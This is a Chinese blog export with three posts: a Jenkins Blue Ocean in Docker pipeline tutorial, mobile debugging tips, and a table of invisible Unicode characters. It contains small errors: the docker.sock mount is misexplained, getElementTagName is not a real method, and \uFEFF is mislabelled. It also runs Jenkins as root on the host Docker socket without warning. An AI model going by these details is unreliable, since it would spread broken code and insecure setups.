class="line"><span class="comment"># 如果需要退出当前容器的运行状态，输入快捷键ctrl + c</span></span><br></pre></td></tr></table></figure>

<p>说明：</p>
<p><code>wsl</code>：windows10 子系统 Linux，这里用的是微软商店中下载的 Debian，升级到 wsl2</p>
<p><code>\</code>：linux 环境空格输出</p>
<p><code>--name</code>：为容器分配名称</p>
<p><code>--rm</code>：容器退出时自动移除，可以不写，后面用<code>docker rm</code>移除该容器便可。</p>
<p><code>--restart</code>：容器退出时应用的重启策略</p>
<p><code>-u</code>：即<code>--user</code>，用户名或 UID（格式：&lt;name|uid&gt;[:&lt;group|gid&gt;]）</p>
<p><code>-p</code>：即<code>--publish</code>，将容器的端口发布到主机</p>
<p><code>-v</code>：即<code>--volume</code>，绑定挂载卷</p>
<p><code>-v jenkins-data:/var/jenkins_home</code>：将容器中的 <code>/var/jenkins_home</code> 目录映射到 Docker <a href="https://docs.docker.com/engine/admin/volumes/volumes/">volume</a> ，并将其命名为 <code>jenkins-data</code>。如果该卷不存在, 那么 <code>docker run</code> 命令会自动为你创建卷。</p>
<p><code>-v /var/run/docker.sock:/var/run/docker.sock</code>：在前台运行并将其日志直接发送到您的终端，<a href="https://docs.docker.com/config/daemon/">详见官网文档</a></p>
<p><code>docker run</code> 命令更多参数使用信息，<a href="https://docs.docker.com/engine/reference/commandline/run/">详见官方文档</a></p>
<h3 id="使用-Docker-Compose-运行-Jenkins"><a href="#使用-Docker-Compose-运行-Jenkins" class="headerlink" title="使用 Docker Compose 运行 Jenkins"></a>使用 Docker Compose 运行 Jenkins</h3><p>当然，每次<code>docker run...</code>，不方便，可以在需要的路径下配置<code>compose.yaml</code>文件，并在当前路径下的命令行输入<code>docker compose up</code>，它会读取<code>compose.yaml</code>文件，自动执行命令。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">jenkins:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">jenkinsci/blueocean</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jenkins-data:/var/jenkins_home</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/var/run/docker.sock:/var/run/docker.sock</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">/home/huatree/document:/home</span></span><br><span class="line">    <span class="attr">user:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">always</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">JAVA_OPTS=-Dhudson.model.DirectoryBrowserSupport.CSP=</span> <span class="string">-Dhudson.plugins.git.GitSCM.ALLOW_LOCAL_CHECKOUT=true</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:8080</span></span><br><span class="line">    <span class="attr">stdin_open:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">volumes:</span></span><br><span class="line">  <span class="attr">jenkins-data:</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>更多<code>compse.yaml</code>参数配置，<a href="https://docs.docker.com/compose/compose-file/">详见官方文档</a></p>
<p><code>Dhudson.model.DirectoryBrowserSupport.CSP=空格</code>：确定为 Jenkins 提供的静态文件发送的内容安全策略标头。有关更多详细信息，请参阅<a href="https://www.jenkins.io/doc/book/system-administration/security/configuring-content-security-policy/">配置内容安全策略</a></p>
<p><code>Dhudson.plugins.git.GitSCM.ALLOW_LOCAL_CHECKOUT=true</code>：允许本地目录验证。<a href="https://plugins.jenkins.io/git/#plugin-content-allow-local-checkout">更多信息详见</a></p>
<h2 id="访问-Jenkins-x2F-Blue-Ocean-Docker-容器"><a href="#访问-Jenkins-x2F-Blue-Ocean-Docker-容器" class="headerlink" title="访问 Jenkins&#x2F;Blue Ocean Docker 容器"></a>访问 Jenkins&#x2F;Blue Ocean Docker 容器</h2><h3 id="解锁-Jenkins"><a href="#解锁-Jenkins" class="headerlink" title="解锁 Jenkins"></a>解锁 Jenkins</h3><p>当你第一次访问一个新的 Jenkins 实例时, 要求你使用自动生成的密码对其进行解锁。</p>
<p>当在终端&#x2F;命令提示窗口出现两组星号时, 浏览 <code>http://localhost:8080</code> 并等待 <strong>解锁 Jenkins</strong> 页面出现。</p>
<p><img src="https://cdn.huatree.top/image-20220516093617699.png" alt="image-20220516093617699"></p>
<p>再次从终端&#x2F;命令提示窗口, 复制自动生成的字母数字密码(在两组星号之间)。</p>
<p><img src="https://cdn.huatree.top/image-20220516093715354.png" alt="image-20220516093715354"></p>
<p>在<strong>解锁 Jenkins</strong> 页面, 粘贴该密码到 <strong>管理员密码</strong> 字段并点击 <strong>继续</strong>，进入新手入门页面。</p>
<p><img src="https://cdn.huatree.top/image-20220516094041627.png" alt="image-20220516094041627"></p>
<h3 id="使用插件自定义-Jenkins"><a href="#使用插件自定义-Jenkins" class="headerlink" title="使用插件自定义 Jenkins"></a>使用插件自定义 Jenkins</h3><p>在<strong>解锁 Jenkins</strong> 后，<strong>自定义 Jenkins</strong> 页面出现，可以选择默认的<strong>安装推荐的插件</strong>。后续可以在插件管理页面进行维护（卸载&#x2F;更新&#x2F;添加）。</p>
<p>安装向导显示了正在配置的 Jenkins 的进程，以及建议安装的插件。这个过程肯需要几分钟。</p>
<h3 id="创建第一个管理员用户"><a href="#创建第一个管理员用户" class="headerlink" title="创建第一个管理员用户"></a>创建第一个管理员用户</h3><p>最后, Jenkins 要求创建你的第一个管理员用户。</p>
<p>当 <strong>创建第一个管理员用户</strong> 页面出现, 在相应的字段中指定你的详细消息并点击 <strong>保存并完成</strong>。</p>
<p><img src="https://cdn.huatree.top/image-20220516095217292.png" alt="image-20220516095217292"></p>
<p>当 <strong>实例配置</strong> 页面出现，根据需要是否配置 <strong>Jenkins URL</strong>，并点击 <strong>保存并完成</strong>。</p>
<p><img src="https://cdn.huatree.top/image-20220516095453149.png" alt="image-20220516095453149"></p>
<p>当 <strong>Jenkins 已就绪</strong> 页面出现, 点击 <strong>开始使用 Jenkins</strong>。</p>
<p><img src="https://cdn.huatree.top/image-20220516095803705.png" alt="image-20220516095803705"></p>
<p>等待一会儿，Jenkins 主页出现。</p>
<p><img src="https://cdn.huatree.top/image-20220516102328899.png" alt="image-20220516102328899"></p>
<h3 id="停止和重启-Jenkins"><a href="#停止和重启-Jenkins" class="headerlink" title="停止和重启 Jenkins"></a>停止和重启 Jenkins</h3><p>在其他时候，如果不用了，你可以通过在终端&#x2F;命令提示窗口输入 <code>Ctrl-C</code>停止 Jenkins&#x2F;Blue Ocean Docker 容器。想用时，执行<code>docker compose start</code>。</p>
<p>另一种场景：正常启动了 Jenkins，关掉命令行工具，该容器并没有停止运行。如果想停止，则终端执行命令<code>docker compose stop</code>。</p>
<h2 id="Fork-和-clone-GitHub-示例仓库"><a href="#Fork-和-clone-GitHub-示例仓库" class="headerlink" title="Fork 和 clone GitHub 示例仓库"></a>Fork 和 clone GitHub 示例仓库</h2><p>通过将应用程序源代码所在的示例仓库 fork 到你自己的 Github 账号中， 并 clone 到本地， 你就可以获取一个”Welcome to React”简单 Node.js 和 React 应用程序。</p>
<p>将示例仓库 <a href="https://github.com/jenkins-docs/simple-node-js-react-npm-app"><code>simple-node-js-react-npm-app</code></a> fork 到你的账户的 Github 仓库中。接着，将你的 GitHub 账户中的 <code>simple-node-js-react-npm-app</code> 仓库 clone 到你本地的如下目录：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">/home/huatree/document/github/simple-node-js-react-npm-app</span><br></pre></td></tr></table></figure>

<p><code>/home/huatree/document</code>是上面<code>compose.yaml</code>的内容，从你主机上的<code>/home/huatree/document</code>目录映射到 Jenkins 容器的 <code>/home</code>。</p>
<h2 id="在-Jenkins-中创建流水线项目"><a href="#在-Jenkins-中创建流水线项目" class="headerlink" title="在 Jenkins 中创建流水线项目"></a>在 Jenkins 中创建流水线项目</h2><p>回到浏览器打开的 Jenkin 页面，再次登录并点<strong>欢迎来到 Jenkins!<strong>下的</strong>create new jobs</strong> 。 如果没有看到上述内容，请点击左侧的 <strong>新建任务</strong> 。</p>
<p>在 <strong>输入一个任务名称</strong> 域, 填写你的新的流水线项目的名称 (比如<code>simple-node-js-react-npm-app</code>)</p>
<p>向下滚动并单击 <strong>流水线</strong>, 然后点击页面末尾的 <strong>确定</strong></p>
<p><img src="https://cdn.huatree.top/image-20220516105037672.png" alt="image-20220516105037672"></p>
<p>在 <strong>General&gt;描述</strong> 字域为你的流水线项目做一个简短的描述(比如. <code>An entry-level Pipeline demonstrating how to use Jenkins to build a simple Node.js and React application with npm.</code>)</p>
<p><img src="https://cdn.huatree.top/image-20220516105429577.png" alt="image-20220516105429577"></p>
<p>在<strong>流水线</strong>栏，在<strong>定义</strong>域，选择 <strong>Pipeline script from SCM</strong> 选项。此选项指示 Jenkins 从源代码管理（SCM）仓库获取你的流水线， 这里的仓库就是你 clone 到本地的 Git 仓库。</p>
<p>在 <strong>SCM</strong> 域中，选择 <strong>Git</strong>。有关<code>GitSCM</code>更多信息，<a href="https://www.jenkins.io/doc/pipeline/steps/workflow-scm-step/">详见</a></p>
<p>在 <strong>Repository URL</strong> 域中，可以有如下填写操作：</p>
<p>如果填写 clone 到本地的仓库<strong>映射路径</strong>：<code>/home/github/simple-node-js-react-npm-app</code>，<strong>Credentials</strong>项就默认即可，无需添加凭据，因为<code>compose.yaml</code>文件已经配置了如下内容：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">environment:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">JAVA_OPTS=-Dhudson.model.DirectoryBrowserSupport.CSP=</span> <span class="string">-Dhudson.plugins.git.GitSCM.ALLOW_LOCAL_CHECKOUT=true</span></span><br></pre></td></tr></table></figure>

<p>如果填写的是远程仓库路径：如<code>git@github.com:huatree/simple-node-js-react-npm-app.git</code>，则在<strong>Credentials</strong>域中，添加<strong>凭据</strong>，选择类型为<code>SSH Username with private key</code>，然后复制粘贴本地的.ssh 目录下的<strong>私钥</strong>，点击<strong>确定</strong>，再选中配置好的凭据。</p>
<p><img src="https://cdn.huatree.top/image-20220516105841594.png" alt="image-20220516105841594"></p>
<p>其他项默认即可（后续可根据需要自行修改配置），点击 <strong>保存</strong> 保存你的流水线项目。你现在可以开始创建你的 <code>Jenkinsfile</code>，这些文件会被添加到你的本地仓库。</p>
<h3 id="将你的初始流水线创建为-Jenkinsfile"><a href="#将你的初始流水线创建为-Jenkinsfile" class="headerlink" title="将你的初始流水线创建为 Jenkinsfile"></a>将你的初始流水线创建为 Jenkinsfile</h3><p>在<code>simple-node-js-react-npm-app</code>项目根目录下创建<code>Jenkinsfile</code>文件，内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">  agent &#123;</span><br><span class="line">    docker &#123;</span><br><span class="line">      image <span class="string">&#x27;node:10&#x27;</span></span><br><span class="line">      args <span class="string">&#x27;-p 3000:3000&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  stages &#123;</span><br><span class="line">    <span class="title function_">stage</span>(<span class="params"><span class="string">&#x27;Build&#x27;</span></span>) &#123;</span><br><span class="line">      steps &#123;</span><br><span class="line">        sh <span class="string">&#x27;npm install&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>更多<code>Jenkinsfile</code>配置，<a href="https://www.jenkins.io/zh/doc/book/pipeline/jenkinsfile/">详见官方文档</a></p>
<p>保存并提交你编辑的 <code>Jenkinsfile</code> 到你本地的 <code>simple-node-js-react-npm-app</code> Git 仓库，推送到远程<code>simple-node-js-react-npm-app</code>仓库。</p>
<p>回到浏览器 Jenkins 主页面，左侧选择<strong>打开 Blue Ocean</strong>，弹出框提示”该任务还未运行“，点击<strong>运行</strong>。等待一会儿，出现报错</p>
<p><img src="https://cdn.huatree.top/image-20220516113556323.png" alt="image-20220516113556323"></p>
<p>此时，需要安装<code>Docker</code>和<code>Docker Pipeline</code>2 个插件。转到 Jenkins 根页面 &gt; 插件管理 &gt; 可用并搜索插件。安装好后，重启 Jenkins 服务生效，再次运行即可。</p>
<p>如果 Jenkins 成功构建了你的应用，Blue Ocean 的界面就会变绿。</p>
<p><img src="https://cdn.huatree.top/image-20220516122621742.png" alt="image-20220516122621742"></p>
<h3 id="向流水线添加-Test-阶段"><a href="#向流水线添加-Test-阶段" class="headerlink" title="向流水线添加 Test 阶段"></a>向流水线添加 Test 阶段</h3><p>回到文本编辑器&#x2F;IDE，打开<code>Jenkinsfile</code>，如下编辑</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">    agent &#123;</span><br><span class="line">        docker &#123;</span><br><span class="line">            image <span class="string">&#x27;node:lts-buster-slim&#x27;</span></span><br><span class="line">            args <span class="string">&#x27;-p 3000:3000&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    environment &#123;</span><br><span class="line">        <span class="variable constant_">CI</span> = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    stages &#123;</span><br><span class="line">        <span class="title function_">stage</span>(<span class="params"><span class="string">&#x27;Build&#x27;</span></span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                sh <span class="string">&#x27;npm install&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">stage</span>(<span class="params"><span class="string">&#x27;Test&#x27;</span></span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                sh <span class="string">&#x27;./jenkins/scripts/test.sh&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_">stage</span>(<span class="params"><span class="string">&#x27;Deliver&#x27;</span></span>) &#123;</span><br><span class="line">            steps &#123;</span><br><span class="line">                sh <span class="string">&#x27;./jenkins/scripts/deliver.sh&#x27;</span></span><br><span class="line">                input <span class="attr">message</span>: <span class="string">&#x27;Finished using the web site? (Click &quot;Proceed&quot; to continue)&#x27;</span></span><br><span class="line">                sh <span class="string">&#x27;./jenkins/scripts/kill.sh&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改<code>package.json</code></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="attr">&quot;test&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cross-env CI=true react-scripts test --env=jsdom&quot;</span></span><br></pre></td></tr></table></figure>

<p>修改<code>jenkins/scripts/test.th</code></p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 去掉npm install --save-dev cross-env的注释</span></span><br><span class="line">npm install --save-dev cross-env</span><br></pre></td></tr></table></figure>

<p>再次提交并推送到远程仓库，运行构建，结果如下</p>
<p><img src="https://cdn.huatree.top/image-20220516124427698.png" alt="image-20220516124427698"></p>
<h3 id="给流水线添加最终交付阶段"><a href="#给流水线添加最终交付阶段" class="headerlink" title="给流水线添加最终交付阶段"></a>给流水线添加最终交付阶段</h3><p>回到文本编辑器&#x2F;IDE，打开<code>Jenkinsfile</code>，如下编辑</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">pipeline &#123;</span><br><span class="line">  agent &#123;</span><br><span class="line">    docker &#123;</span><br><span class="line">      image <span class="string">&#x27;node:10&#x27;</span></span><br><span class="line">      args <span class="string">&#x27;-p 3000:3000&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  environment &#123;</span><br><span class="line">    <span class="variable constant_">CI</span> = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">  stages &#123;</span><br><span class="line">    <span class="title function_">stage</span>(<span class="params"><span class="string">&#x27;Build&#x27;</span></span>) &#123;</span><br><span class="line">      steps &#123;</span><br><span class="line">        sh <span class="string">&#x27;npm install&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">stage</span>(<span class="params"><span class="string">&#x27;Test&#x27;</span></span>) &#123;</span><br><span class="line">      steps &#123;</span><br><span class="line">        sh <span class="string">&#x27;./jenkins/scripts/test.sh&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">stage</span>(<span class="params"><span class="string">&#x27;Deliver&#x27;</span></span>) &#123;</span><br><span class="line">      steps &#123;</span><br><span class="line">        sh <span class="string">&#x27;./jenkins/scripts/deliver.sh&#x27;</span></span><br><span class="line">        input <span class="attr">message</span>: <span class="string">&#x27;Finished using the web site? (Click &quot;proceed&quot; to continue)&#x27;</span></span><br><span class="line">        sh <span class="string">&#x27;./jenkins/scripts/kill.sh&#x27;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>提交并推送到远程仓库，点击<strong>立即构建或运行</strong>。</p>
<p><img src="https://cdn.huatree.top/image-20220516130020852.png" alt="image-20220516130020852"></p>
<p>观察 “Deliver” 阶段 (必要的时候点击它), 然后点击 绿色的 <strong><code>./jenkins/scripts/deliver.sh</code></strong> 步骤扩展它的内容并向下滚动直到看见 <code>http://localhost:3000</code> 链接，访问它。</p>
<p><img src="https://cdn.huatree.top/image-20220516130125776.png" alt="image-20220516130125776"></p>
<p>点击 <code>http://localhost:3000</code> 链接在一个新的浏览器选项卡查看你的 Node.js 和 React 应用的运行(在开发模式下) 。 你会 看到一个标题为 <strong>Welcome to React</strong> 的网页&#x2F;站点。</p>
<p><img src="https://cdn.huatree.top/image-20220516130201358.png" alt="image-20220516130201358"></p>
<p>当你查看完页面&#x2F;站点, 点击 <strong>继续</strong> 按钮以完成流水线的执行。</p>
<p><img src="https://cdn.huatree.top/image-20220516130920146.png" alt="image-20220516130920146"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>做得好！您刚刚使用 Jenkins 通过 npm 构建了一个简单的 Node.js 和 React 应用程序！</p>
<p>您在上面创建的 “Build”, “Test” 和 “Deliver” 阶段是使用 Jenkins 中的 Maven 构建更复杂的 Node.js 和 React 应用程序以及与其他技术栈集成的 Node.js 和 React 应用程序的基础。</p>
<p>由于 Jenkins 具有极高的可扩展性，因此可以对其进行修改和配置，以处理构建协调和自动化的几乎任何方面。</p>
<p>要详细了解 Jenkins 可以做什么，请查看：</p>
<ul>
<li><a href="https://www.jenkins.io/doc/tutorials">教程概览</a> 页面中的其他介绍教程。</li>
<li><a href="https://www.jenkins.io/doc/book">用户手册</a> 使用 Jenkins 的更多细节，例如 <a href="https://www.jenkins.io/doc/book/pipeline">Pipelines</a> (尤其是 <a href="https://www.jenkins.io/doc/book/pipeline/syntax">Pipeline 语法</a>) 和 <a href="https://www.jenkins.io/doc/book/blueocean">Blue Ocean</a> 界面。</li>
<li><a href="https://www.jenkins.io/node">Jenkins blog</a> 资讯，其他教程和更新。</li>
</ul>
<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p>[1] <a href="https://www.jenkins.io/zh/doc/tutorials/build-a-node-js-and-react-app-with-npm/#%E4%BD%BF%E7%94%A8npm%E6%9E%84%E5%BB%BAnode-js%E5%92%8Creact%E5%BA%94%E7%94%A8">使用 npm 构建 Node.js 和 React 应用</a></p>
<p>[2] <a href="https://stackoverflow.com/questions/62253474/jenkins-invalid-agent-type-docker-specified-must-be-one-of-any-label-none">Jenkins. Invalid agent type “docker” specified. Must be one of [any, label, none]</a></p>
<p>[3] <a href="https://issues.jenkins.io/browse/JENKINS-68571?jql=text%20~%20%22ALLOW_LOCAL_CHECKOUT%22">ALLOW_LOCAL_CHECKOUT set but local checkout not available</a></p>
<p>[4] <a href="https://www.jenkins.io/doc/pipeline/steps/workflow-scm-step/#pipeline-scm-step">Pipeline: SCM Step</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>CI&amp;CD</tag>
        <tag>Jenkins</tag>
      </tags>
  </entry>
  <entry>
    <title>使用浏览器配合手机调试&amp;使用Proxy劫持（3类真机调试技巧）</title>
    <url>/2022/05/15/20220515-%E4%BD%BF%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E9%85%8D%E5%90%88%E6%89%8B%E6%9C%BA%E8%B0%83%E8%AF%95&amp;%E4%BD%BF%E7%94%A8Proxy%E5%8A%AB%E6%8C%81%EF%BC%883%E7%B1%BB%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7%EF%BC%89/</url>
    <content><![CDATA[<p><img src="https://cdn.huatree.top/image-20220515130434086.png" alt="image-20220515130434086"></p>
<span id="more"></span>

<h2 id="Chrome-Android-x2F-Safari-IOS"><a href="#Chrome-Android-x2F-Safari-IOS" class="headerlink" title="Chrome+Android&#x2F;Safari+IOS"></a>Chrome+Android&#x2F;Safari+IOS</h2><p>适用场景：开发环境真机调试</p>
<h3 id="Safari-IOS"><a href="#Safari-IOS" class="headerlink" title="Safari+IOS"></a>Safari+IOS</h3><p>Mac Safari 浏览器（顶部菜单栏左上角）&gt;高级&gt;选中在菜单栏中显示“开发”菜单，此时，浏览器界面顶部菜单多出一个“开发”选项。</p>
<p>IOS 手机&gt;设置&gt;Safari 浏览器&gt;高级&gt;打开 Web 检查器，IOS 手机需数据线连接到 Mac，回到 Mac Safari 浏览器，选择菜单栏上的开发选项，出现<code>xxx&#39; iPhone</code>，则 success。</p>
<p>命令行输入<code>ipconfig</code>，查看 Mac 的本地局域网 IP 地址。该地址替换项目的 localhost，正常访问项目。Mac Safari 浏览器的开发选项&gt;<code>xxx&#39; iPhone</code>&gt;会出现该 IP，点击开始真机调试。</p>
<p>没有 Mac 怎么办？苹果早期推出过在 Windows PC 上的 Safari 浏览器，很可惜，Apple 不再提供 Windows 版 Safari 浏览器更新。Windows 版 Safari 浏览器 5.1.7 是适用于 Windows 的最后一个版本，而且现已过时。<a href="https://support.apple.com/zh-cn/HT204416">官网详见</a></p>
<h3 id="Chrome-Android"><a href="#Chrome-Android" class="headerlink" title="Chrome+Android"></a>Chrome+Android</h3><p>Android 手机打开开发者模式&gt;打开 USB 调试，Android 手机需连接到 Win PC，Win Chrome 浏览器地址栏输入<code>chrome://inspect/#devices</code>，稍等一会儿，手机会出现是否允许 USB 调试之类的弹窗，允许便是。再回到当前 Win Chrome 浏览器，就会出现当前数据线连接 win PC 的手机型号、WebView 相关信息，则 Success。点击 inspect，就可以开始真机调试了，如果界面没有反应，需要考虑手机和 PC 浏览器版本是否是最新版了。如果还是白屏无反应，则需要开启专有虚拟网络（科学上网环境）。</p>
<p>为什么会白屏，出不来，是因为这个过程中，需要调取谷歌的某些服务，而这些服务需要科学上网环境才可以访问。</p>
<p>本地跑的项目，IP 地址别忘了查询替换 localhost，win PC 下查询 IP，可通过 cmd 命令行输入<code>ipconfig</code>获取。</p>
<h2 id="Fiddler-x2F-Charles"><a href="#Fiddler-x2F-Charles" class="headerlink" title="Fiddler&#x2F;Charles"></a>Fiddler&#x2F;Charles</h2><p>使用 Proxy 劫持。适用场景：线上环境调试</p>
<p>Fiddler&#x2F;Charles 比较局限性，只能看到接口的情况。</p>
<h2 id="Weinre-Spy-Debugger-vConsole"><a href="#Weinre-Spy-Debugger-vConsole" class="headerlink" title="Weinre,Spy-Debugger,vConsole"></a>Weinre,Spy-Debugger,vConsole</h2><p>项目里插入脚本调试，也可以说是借助依赖，可以是 cdn，也可以安装本地项目中。</p>
<h3 id="Weinre"><a href="#Weinre" class="headerlink" title="Weinre"></a>Weinre</h3><p><a href="http://people.apache.org/~pmuellr/weinre/">Weinre(Web Inspector Remote)</a>是一款基于 Web Inspector(Webkit)的远程调试工具， 它使用 JS 编写， 可以让我们在电脑上直接调试运行在手机上的远程页面。 与传统的 Web Inspector 的使用场景不同。</p>
<p>Weinre 的使用场景， 调试的页面在手机上， 调试工具在 PC 的 chrome， 二者通过网络连接通信。</p>
<p><a href="https://github.com/nupthale/weinre">更多详见</a></p>
<h3 id="Spy-Debugger"><a href="#Spy-Debugger" class="headerlink" title="Spy-Debugger"></a>Spy-Debugger</h3><p>微信调试，各种 WebView 样式调试、手机浏览器的页面真机调试。便捷的远程调试手机页面、抓包工具，支持：HTTP&#x2F;HTTPS，无需 USB 连接设备。</p>
<p><a href="https://github.com/wuchangming/spy-debugger">更多详见</a></p>
<h3 id="vConsole"><a href="#vConsole" class="headerlink" title="vConsole"></a>vConsole</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/vconsole@latest/dist/vconsole.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// VConsole will be exported to `window.VConsole` by default.</span></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">var</span> vConsole = <span class="keyword">new</span> <span class="variable language_">window</span>.<span class="title class_">VConsole</span>()</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://github.com/Tencent/vConsole">更多详见</a></p>
<p>其他：<a href="https://www.npmjs.com/package/eruda">eruda</a></p>
]]></content>
      <categories>
        <category>成长经历</category>
      </categories>
      <tags>
        <tag>调试</tag>
      </tags>
  </entry>
  <entry>
    <title>不是空格的不可见字符</title>
    <url>/2022/05/16/20220516-%E4%B8%8D%E6%98%AF%E7%A9%BA%E6%A0%BC%E7%9A%84%E4%B8%8D%E5%8F%AF%E8%A7%81%E5%AD%97%E7%AC%A6/</url>
    <content><![CDATA[<p>混合 APP 中，默认设置了导航栏的标题，需求是跳转的 H5 页面中不展示导航栏的标题。</p>
<span id="more"></span>

<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  var titleEl = document.getElementTagName(&#x27;title&#x27;)[0]</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  titleEl.text = &#x27;\u200E&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  <span class="comment">&lt;!-- 交互3.0 --&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  var titleBarParams = &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    title: &#123;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      text: &#x27;\u200E&#x27;,</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">      fontColor: &#x27;#ffffff&#x27;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">  &#125;</span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="开发中容易被坑的特殊字符编码"><a href="#开发中容易被坑的特殊字符编码" class="headerlink" title="开发中容易被坑的特殊字符编码"></a>开发中容易被坑的特殊字符编码</h3><table>
<thead>
<tr>
<th>名称</th>
<th>Unicode</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>普通空格符</td>
<td>\u0020</td>
<td></td>
</tr>
<tr>
<td>Backspace</td>
<td>\u0008</td>
<td>\b</td>
</tr>
<tr>
<td>水平制表符</td>
<td>\u0009</td>
<td>\t</td>
</tr>
<tr>
<td>换行符</td>
<td>\u000A</td>
<td>\n</td>
</tr>
<tr>
<td>垂直制表符</td>
<td>\u000B</td>
<td>\v</td>
</tr>
<tr>
<td>换页符</td>
<td>\u000C</td>
<td>\f</td>
</tr>
<tr>
<td>回车符</td>
<td>\u000D</td>
<td>\r</td>
</tr>
<tr>
<td>不换行空格</td>
<td>\u00A0</td>
<td>看上去和空格一样，实际上是在 HTML 中不自动换行，曾在从 word 拷贝出来的文本中复现</td>
</tr>
<tr>
<td>行分隔符</td>
<td>\u2028</td>
<td></td>
</tr>
<tr>
<td>段落分隔符</td>
<td>\u2029</td>
<td></td>
</tr>
<tr>
<td>字节顺序标记（零宽非连接符）</td>
<td>\uFEFF</td>
<td></td>
</tr>
<tr>
<td>从左至右书写标记</td>
<td>\u200E</td>
<td></td>
</tr>
<tr>
<td>从右至左书写标记</td>
<td>\u200F</td>
<td></td>
</tr>
<tr>
<td>零宽连接符</td>
<td>\u200D</td>
<td>因为是零宽，肉眼看不到，从网页中拷贝出来的字符中会出现</td>
</tr>
<tr>
<td>另一种空格符</td>
<td>\u2006</td>
<td>看上去和空格一样，但 Unicode 不同</td>
</tr>
</tbody></table>
<p><a href="https://www.bejson.com/convert/unicode_chinese/">Unicode 在线转换工具</a></p>
]]></content>
      <categories>
        <category>工作点滴</category>
      </categories>
      <tags>
        <tag>html</tag>
      </tags>
